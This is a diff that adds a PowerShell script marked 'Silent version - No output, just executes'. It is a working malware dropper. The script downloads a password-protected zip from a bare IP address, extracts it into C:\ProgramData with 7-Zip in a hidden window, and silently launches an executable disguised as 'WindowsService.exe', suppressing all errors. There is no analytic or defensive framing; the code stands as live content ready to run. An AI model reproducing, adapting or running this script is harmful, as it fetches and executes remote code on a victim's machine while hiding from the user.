@@ -1,0 +1,48 @@
+# Silent version - No output, just executes
+$zipUri = "http://41.216.188.184/downloads/windows-service.zip"
+$extractPath = "C:\ProgramData"
+$zipPath = [System.IO.Path]::Combine($extractPath, "windows-service.zip")
+$exePath = [System.IO.Path]::Combine($extractPath, "WindowsService.exe")
+$zipPassword = "9171"
+
+try {
+    if (-not (Test-Path $extractPath)) {
+        New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
+    }
+
+    $client = New-Object System.Net.WebClient
+    $client.DownloadFile($zipUri, $zipPath)
+    $client.Dispose()
+
+    if (Test-Path $zipPath) {
+        $7zipPaths = @("C:\Program Files\7-Zip\7z.exe", "C:\Program Files (x86)\7-Zip\7z.exe")
+        $7zipFound = $false
+
+        foreach ($7zipPath in $7zipPaths) {
+            if (Test-Path $7zipPath) {
+                $arguments = @(
+                    "x",
+                    "`"$zipPath`"",
+                    "-p$zipPassword",
+                    "-o`"$extractPath`"",
+                    "-y"
+                )
+                $process = Start-Process -FilePath $7zipPath -ArgumentList $arguments -Wait -PassThru -WindowStyle Hidden
+                
+                if ($process.ExitCode -eq 0) {
+                    $7zipFound = $true
+                    break
+                }
+            }
+        }
+
+        if ($7zipFound) {
+            Start-Sleep -Seconds 2
+            if (Test-Path $exePath) {
+                Start-Process $exePath -WindowStyle Hidden
+            }
+        }
+    }
+} catch {
+    # Silent fail
+}
